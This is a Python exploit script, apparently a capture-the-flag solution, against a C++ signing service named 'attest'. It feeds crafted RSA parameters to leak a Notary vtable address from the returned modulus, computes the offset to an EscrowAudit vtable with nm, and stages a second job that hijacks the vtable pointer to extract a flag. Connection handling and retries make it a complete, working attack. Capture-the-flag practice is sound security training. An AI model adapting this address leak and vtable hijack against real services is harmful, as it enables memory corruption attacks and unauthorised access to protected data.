import os
import sys
import socket
import subprocess
import shutil
import re
from math import gcd


class Pipe:
    def __init__(self, sock=None, proc=None):
        self.sock = sock
        self.proc = proc
        self.buf = b""

    def _read_some(self):
        if self.sock is not None:
            return self.sock.recv(4096)
        return os.read(self.proc.stdout.fileno(), 4096)

    def until(self, marker):
        m = marker.encode() if isinstance(marker, str) else marker
        while m not in self.buf:
            chunk = self._read_some()
            if not chunk:
                break
            self.buf += chunk
        idx = self.buf.find(m)
        if idx < 0:
            data = self.buf
            self.buf = b""
            return data
        end = idx + len(m)
        data = self.buf[:end]
        self.buf = self.buf[end:]
        return data

    def line_after(self, marker):
        self.until(marker)
        line = b""
        while b"\n" not in line:
            if b"\n" in self.buf:
                nl = self.buf.find(b"\n")
                line += self.buf[:nl]
                self.buf = self.buf[nl + 1:]
                break
            chunk = self._read_some()
            if not chunk:
                break
            line += chunk
            if b"\n" in line:
                nl = line.find(b"\n")
                self.buf = line[nl + 1:] + self.buf
                line = line[:nl]
                break
        return line.decode(errors="replace")

    def send(self, s):
        b = s.encode() if isinstance(s, str) else s
        if self.sock is not None:
            self.sock.sendall(b)
        else:
            self.proc.stdin.write(b)
            self.proc.stdin.flush()


def vtable_offset(binary):
    nm = shutil.which("nm")
    out = subprocess.check_output([nm, binary]).decode()
    syms = {}
    for line in out.splitlines():
        parts = line.split()
        if len(parts) >= 3 and parts[2] in ("_ZTV6Notary", "_ZTV11EscrowAudit"):
            syms[parts[2]] = int(parts[0], 16)
    return syms["_ZTV11EscrowAudit"] - syms["_ZTV6Notary"]


def to_hex_be(value):
    if value == 0:
        return "00"
    b = value.to_bytes((value.bit_length() + 7) // 8, "big")
    return b.hex()


def modinv(a, m):
    return pow(a, -1, m)


def stage_job(p, e, pp, q):
    p.send("1\n")
    p.until("e> ")
    p.send(to_hex_be(e) + "\n")
    p.until("p> ")
    p.send(to_hex_be(pp) + "\n")
    p.until("q> ")
    p.send(to_hex_be(q) + "\n")
    p.until("job staged")


def add_notary(p):
    p.send("3\n")
    p.until("kind")
    p.send("1\n")
    p.until("notary ready")


def submit_doc(p, doc_hex):
    p.send("2\n")
    p.until("doc> ")
    p.send(doc_hex + "\n")
    line = p.line_after("modulus ")
    return int(line.strip(), 16)


def sign(p, msg_hex):
    p.send("4\n")
    p.until("msg> ")
    p.send(msg_hex + "\n")
    line = p.line_after("audit ")
    return line.strip()


def run_once(pipe, offset):
    pipe.until("prepare")

    q0 = 65537
    stage_job(pipe, e=3, pp=2, q=q0)
    add_notary(pipe)
    modulus = submit_doc(pipe, "0011")
    assert modulus % q0 == 0, "modulus not divisible by q0"
    p_prime = modulus // q0
    sys.stderr.write("[*] leaked Notary vtable = 0x%x\n" % p_prime)

    target = p_prime + offset
    base = p_prime - 1
    if gcd(target, base) != 1:
        sys.stderr.write("[!] p'-1 shares a factor with target, reconnecting for fresh layout\n")
        return None

    q2 = None
    lam = None
    for r in [1000003, 1000033, 1000037, 1000039, 1000081, 1000099, 1000117, 1000121]:
        cand = base // gcd(base, r) * r
        if cand > target and gcd(target, cand) == 1:
            q2 = r + 1
            lam = cand
            break
    if q2 is None:
        sys.stderr.write("[!] no suitable q' found, reconnecting\n")
        return None

    e_prime = modinv(target, lam)
    sys.stderr.write("[*] target = 0x%x, q'=%d, e'=0x%x\n" % (target, q2, e_prime))

    stage_job(pipe, e=e_prime, pp=2, q=q2)
    add_notary(pipe)
    modulus2 = submit_doc(pipe, "0011")
    p2 = modulus2 // q2
    assert p2 == p_prime, "vtable moved between rounds"

    audit_hex = sign(pipe, "00" * 80)
    flag = bytes.fromhex(audit_hex).rstrip(b"\x00").decode(errors="replace")
    return flag


def connect(binary):
    host = os.environ.get("HOST")
    port = os.environ.get("PORT")
    if host and port:
        s = socket.create_connection((host, int(port)))
        return Pipe(sock=s), None
    proc = subprocess.Popen([binary], stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE)
    return Pipe(proc=proc), proc


def main():
    binary = os.environ.get("BINARY", "./attest")
    offset = vtable_offset(binary)
    sys.stderr.write("[*] vtable offset from binary = 0x%x\n" % offset)
    for attempt in range(40):
        pipe, proc = connect(binary)
        try:
            flag = run_once(pipe, offset)
        except Exception as ex:
            sys.stderr.write("[!] attempt failed: %r\n" % ex)
            flag = None
        if proc is not None:
            try:
                proc.kill()
            except Exception:
                pass
        if flag:
            print("RECOVERED_FLAG:", flag)
            return
    print("FAILED: no flag recovered")
    sys.exit(1)


if __name__ == "__main__":
    main()
